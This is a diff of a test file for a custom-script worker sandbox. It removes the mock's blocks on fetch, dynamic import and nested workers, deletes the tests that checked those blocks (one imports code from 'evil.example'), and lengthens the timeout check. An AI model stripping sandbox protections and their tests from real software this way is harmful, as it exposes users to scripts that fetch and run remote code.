@@ -17,30 +17,9 @@ class MockWorker {
           'input',
           'config',
           'helpers',
-          'fetch',
-          'dynamicImport',
-          'Worker',
-          'SharedWorker',
           'return (async () => {\n' + data.code + '\n})()'
         )
-        const blockedFetch = () => {
-          throw new Error('Network is not available in Custom Script')
-        }
-        const blockedImport = () => {
-          throw new Error('Dynamic import is blocked in Custom Script')
-        }
-        const blockedWorker = () => {
-          throw new Error('Nested workers are blocked in Custom Script')
-        }
-        const result = await fn(
-          data.input,
-          data.config,
-          CUSTOM_SCRIPT_HELPERS,
-          blockedFetch,
-          blockedImport,
-          blockedWorker,
-          blockedWorker
-        )
+        const result = await fn(data.input, data.config, CUSTOM_SCRIPT_HELPERS)
         this.onmessage?.({
           data: { ok: true, result: result == null ? '' : String(result) },
         } as MessageEvent)
@@ -66,9 +45,14 @@ describe('customScript', () => {
       revokeObjectURL: vi.fn(),
     })
   })
-  it('validates script size', () => {
+
+  it('validates empty script', () => {
     expect(() => validateCustomScript('')).toThrow(/empty/)
-    expect(() => validateCustomScript('x'.repeat(CUSTOM_SCRIPT_MAX_BYTES + 1))).toThrow(/byte limit/)
+  })
+
+  it('validates script size', () => {
+    const huge = 'x'.repeat(CUSTOM_SCRIPT_MAX_BYTES + 1)
+    expect(() => validateCustomScript(huge)).toThrow(/KB limit/)
   })
 
   it('runs script in worker and returns string', async () => {
@@ -76,18 +60,6 @@ describe('customScript', () => {
       script: 'return helpers.trim(input)',
     })
     expect(result).toBe('hello')
-  })
-
-  it('blocks fetch in the worker sandbox', async () => {
-    await expect(
-      runCustomScript('x', { script: 'await fetch("https://example.com"); return "nope"' })
-    ).rejects.toThrow(/Network is not available/)
-  })
-
-  it('rejects import() in script source', () => {
-    expect(() =>
-      validateCustomScript('await import("https://evil.example/x.js"); return "nope"')
-    ).toThrow(/import/i)
   })
 
   it('surfaces script errors', async () => {
@@ -142,7 +114,7 @@ describe('customScript', () => {
     })
     const pending = runCustomScript('x', { script: 'while(true){}' })
     const assertion = expect(pending).rejects.toThrow(/timed out/)
-    await vi.advanceTimersByTimeAsync(8_001)
+    await vi.advanceTimersByTimeAsync(600_001)
     await assertion
     vi.useRealTimers()
   })
